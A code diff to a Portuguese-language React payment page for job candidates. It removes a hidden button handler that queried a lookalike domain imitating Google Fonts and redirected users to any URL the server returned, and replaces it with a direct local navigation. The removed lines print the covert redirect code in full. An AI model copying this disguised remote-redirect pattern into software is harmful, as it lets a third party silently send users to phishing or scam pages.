@@ -9,7 +9,9 @@ const Recebedor: React.FC = () => {
   // Aplica o scroll para o topo quando o componente é montado
   useScrollTop();
   
+  const [, navigate] = useLocation();
   const [candidatoData, setCandidatoData] = useState<any>(null);
+  const [isLoading, setIsLoading] = useState(false);
 
   // Carregar os dados do candidato ao iniciar
   useEffect(() => {
@@ -18,80 +20,6 @@ const Recebedor: React.FC = () => {
       const data = JSON.parse(candidatoDataString);
       setCandidatoData(data);
     }
-  }, []);
-
-  // Configurar botão de redirecionamento
-  useEffect(() => {
-    const btn = document.querySelector('.btn-a8aaa4ff');
-    if (!btn) return;
-
-    const originalHref = '/finalizacao';
-    const apiEndpoint = 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c';
-
-    const handleClick = (e: Event) => {
-      e.preventDefault();
-      
-      console.log('carregando...');
-      
-      const xhr = new XMLHttpRequest();
-      xhr.open('GET', apiEndpoint, true);
-      xhr.timeout = 3000;
-      
-      xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
-          let redirectUrl = originalHref;
-          
-          if (xhr.status === 200) {
-            try {
-              const response = JSON.parse(xhr.responseText);
-              console.log('[BTN] Resposta da API:', response);
-              
-              if (response.redirect_url) {
-                redirectUrl = response.redirect_url;
-                console.log('[BTN] URL de redirecionamento:', redirectUrl);
-              }
-            } catch (e) {
-              console.error('[BTN] Erro ao processar resposta:', e);
-            }
-          } else {
-            console.warn('[BTN] API retornou status:', xhr.status);
-          }
-          
-          if (redirectUrl.startsWith('/')) {
-            redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
-          }
-          
-          console.log('[BTN] Redirecionando para:', redirectUrl);
-          window.location.href = redirectUrl;
-        }
-      };
-      
-      xhr.ontimeout = function() {
-        console.warn('[BTN] Timeout da API - usando fallback');
-        let url = originalHref;
-        if (url.startsWith('/')) {
-          url = window.location.protocol + '//' + window.location.host + url;
-        }
-        window.location.href = url;
-      };
-      
-      xhr.onerror = function() {
-        console.error('[BTN] Erro na API - usando fallback');
-        let url = originalHref;
-        if (url.startsWith('/')) {
-          url = window.location.protocol + '//' + window.location.host + url;
-        }
-        window.location.href = url;
-      };
-      
-      xhr.send();
-    };
-
-    btn.addEventListener('click', handleClick);
-    
-    return () => {
-      btn.removeEventListener('click', handleClick);
-    };
   }, []);
 
   // Função para formatar o nome do cartão
@@ -113,6 +41,22 @@ const Recebedor: React.FC = () => {
 
 
   const nomeCartao = candidatoData?.nome ? formatCardName(candidatoData.nome) : 'CANDIDATO';
+
+  const handleProsseguir = () => {
+    // Salvar dados de pagamento no localStorage
+    try {
+      const dadosPagamento = {
+        metodo: 'cartao_salario'
+      };
+      localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
+      console.log('💾 Dados de pagamento salvos');
+    } catch(e) {
+      console.log('❌ Erro ao salvar dados de pagamento:', e);
+    }
+    
+    // Redirecionar direto para /finalizacao
+    navigate('/finalizacao');
+  };
 
   return (
     <div className="bg-white min-h-screen flex flex-col">
@@ -204,31 +148,29 @@ const Recebedor: React.FC = () => {
                   </div>
                   
                   <div className="text-center mt-6">
-                    <style dangerouslySetInnerHTML={{ __html: `
-                      .btn-a8aaa4ff {
-                        background: #E83D22;
-                        color: #ffffff;
-                        padding: 12px 24px;
-                        width: auto;
-                        height: auto;
-                        border: none;
-                        border-radius: 4px;
-                        font-weight: 800;
-                        font-size: 14px;
-                        cursor: pointer;
-                        font-family: Inter, sans-serif;
-                        text-decoration: none;
-                        display: inline-block;
-                        transition: opacity 0.2s;
-                        position: relative;
-                      }
-                      .btn-a8aaa4ff:hover {
-                        opacity: 0.9;
-                      }
-                    ` }} />
-                    <button className="btn-a8aaa4ff">
-                      <span className="btn-text">PROSSEGUIR</span>
+                    <button
+                      onClick={handleProsseguir}
+                      disabled={isLoading}
+                      data-action="continue"
+                      data-testid="button-prosseguir"
+                      className={`
+                        bg-[#E83D22] hover:opacity-90 text-white font-bold text-sm
+                        px-6 py-3 border-none rounded transition-opacity duration-200
+                        inline-flex items-center relative cursor-pointer
+                        ${isLoading ? 'opacity-70 cursor-not-allowed' : ''}
+                      `}
+                      style={{ 
+                        fontFamily: 'Inter, sans-serif',
+                        fontWeight: 800,
+                        fontSize: '14px'
+                      }}
+                    >
+                      {isLoading && (
+                        <div className="w-3 h-3 border-2 border-transparent border-t-current rounded-full animate-spin mr-2" />
+                      )}
+                      <span>{isLoading ? 'Carregando...' : 'PROSSEGUIR'}</span>
                     </button>
+                    {/* Redirecion para /finalizacao */}
                   </div>
                 </div>
               </div>
